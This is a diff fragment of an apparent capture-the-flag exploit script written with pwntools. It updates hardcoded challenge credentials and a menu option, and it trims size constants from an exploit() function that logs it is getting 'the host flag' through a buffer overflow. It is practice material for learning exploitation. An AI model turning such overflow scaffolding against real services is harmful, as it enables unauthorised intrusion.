@@ -65,13 +65,13 @@ continue
 # Debuginfo:  Yes
 
 # creds
-login_user = "hoover95"
-login_pass = "7123308"
+login_user = "cors33"
+login_code = "7726404ea39cb43"
 
 
 def leave_prog(io: connect | process):
     # assumes starting from "> "
-    io.sendline(b"3")
+    io.sendline(b"4")
 
 
 def change_username(io: connect | process, payload: bytes):
@@ -82,7 +82,7 @@ def change_username(io: connect | process, payload: bytes):
     io.recvuntil(b"> ")
 
 
-def login(io: process | connect, username=login_user, password=login_pass):
+def login(io: process | connect, username=login_user, password=login_code):
     # login
     io.recvuntil(b"name: ")
     io.sendline(username.encode("ascii"))
@@ -98,8 +98,6 @@ def exploit() -> bool:
     io.info("Getting the host flag via. buffer overflow.")
 
     # from the binary
-    buffer_size = 32
-    struct_size = 72
     payload_size = 88
 
     # function imports
